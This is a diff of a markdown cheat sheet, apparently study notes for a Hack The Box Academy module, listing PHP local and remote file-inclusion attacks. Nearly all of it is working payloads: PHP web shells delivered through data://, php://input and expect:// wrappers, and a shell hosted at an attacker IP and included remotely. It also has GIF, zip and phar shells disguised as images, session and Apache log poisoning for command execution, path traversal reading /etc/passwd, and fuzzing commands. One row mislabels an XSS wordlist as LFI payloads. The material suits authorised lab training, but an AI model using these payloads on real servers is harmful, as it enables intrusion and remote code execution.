@@ -26,42 +26,62 @@
 ## Remote Code Execution  
 
 >The expect wrapper, which allows us to directly run commands through URL streams. Expect works very similarly to the web shells.
->The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the `allow_url_include` setting is enabled in the PHP configurations.
-
+>The data wrapper can be used to include external data, including PHP code. However, the data wrapper is only available to use if the `allow_url_include` setting is enabled in the PHP configurations.  
+  
+## PHP Wrappers  
+  
 | **Command** | **Description** |
 | --------------|-------------------|
-| **PHP Wrappers** |
-| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | [RCE with data wrapper](https://academy.hackthebox.com/module/23/section/253) |
+| `/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id` | RCE [Remote Command Execution with data wrapper](https://academy.hackthebox.com/module/23/section/253) |
 | `echo '<?php system($_GET["cmd"]); ?>' | base64` | Produce the base64 string `PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==` used above webshell that can be passed in to the data wrapper to get command execution |
 | `curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"` | Checking PHP Configurations, Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value |
 | `curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id"` | RCE with input wrapper |
 | `curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"` | RCE with expect wrapper |
-| **RFI** |
+
+## RFI Remote File Inclusion  
+
+| **Command** | **Description** |
+| --------------|-------------------|
 | `echo '<?php system($_GET["cmd"]); ?>' > shell.php && python3 -m http.server <LISTENING_PORT>` | Host web shell |
 | `/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id` | Include remote PHP web shell |
-| **LFI + Upload** |
-| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image |
+
+
+## LFI + Upload  
+
+| **Command** | **Description** |
+| --------------|-------------------|
+| `echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif` | Create malicious image by Crafting Malicious GIF webshell |
 | `/index.php?language=./profile_images/shell.gif&cmd=id` | RCE with malicious uploaded image |
-| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious zip archive 'as jpg' |
+| `echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php` | Create malicious [zip archive](https://academy.hackthebox.com/module/23/section/1493) as `shell.jpg` |
 | `/index.php?language=zip://shell.zip%23shell.php&cmd=id` | RCE with malicious uploaded zip |
-| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar 'as jpg' |
+| `php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg` | Create malicious phar 'as jpg', compile it into a phar file and rename it to `shell.jpg` |
 | `/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id` | RCE with malicious uploaded phar |
-| **Log Poisoning** |
+
+## Log Session Poisoning  
+
+| **Command** | **Description** |
+| --------------|-------------------|
+| `PHPSESSID=nguh23jsnmkjuvesphkhoo2ptt` | Example of session cookie indicate the log path as `/var/lib/php/sessions/sess_nguh23jsnmkjuvesphkhoo2ptt` |
 | `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` | Read PHP session parameters |
-| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Poison PHP session with web shell |
+| `<?php system($_GET["cmd"]);?>` | This webshell url encode to the following payload used for poisoning, `%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` |
+| `/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E` | Poison PHP session with web shell in [web server log with poison attack](https://academy.hackthebox.com/module/23/section/252) |
 | `/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id` | RCE through poisoned PHP session |
 | `curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'` | Poison server log |
 | `/index.php?language=/var/log/apache2/access.log&cmd=id` | RCE through poisoned PHP session |
 
 
-## Misc
+## FUZZING LFI Parameters + Files
 
 | **Command** | **Description** |
 | --------------|-------------------|
-| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php` | Fuzzing for PHP Files |
-| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287` | Fuzz page parameters |
-| `ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287` | Fuzz LFI payloads |
-| `ffuf -w /opt/useful/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
+| `sudo python -m pyftpdlib -p 21` | start a basic FTP server with Python's pyftpdlib |
+| `impacket-smbserver -smb2support share $(pwd)` | SMB file share hosting |
+| `sudo python3 -m http.server <LISTENING_PORT>` | To host our shell.php |
+| `ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://<SERVER_IP>:<PORT>/FUZZ.php` | Fuzzing for PHP Files |
+| `ffuf -c -ic -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'` | Fuzz page for undocumented web parameters using [FFUF Automated Scanning](https://academy.hackthebox.com/module/23/section/1494) |
+| `GET /index.php?view=../../../../../../../../..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd` | After Discovering the web parameter `view`, Burp Suite discovered this LFI |
+| `ffuf -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ'` | Fuzz LFI payloads with [LFI wordlists](https://academy.hackthebox.com/module/23/section/1494) |
+| `ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287` | Fuzz webroot path |
 | `ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287` | Fuzz server configurations |
 | [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)|
 | [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt) |
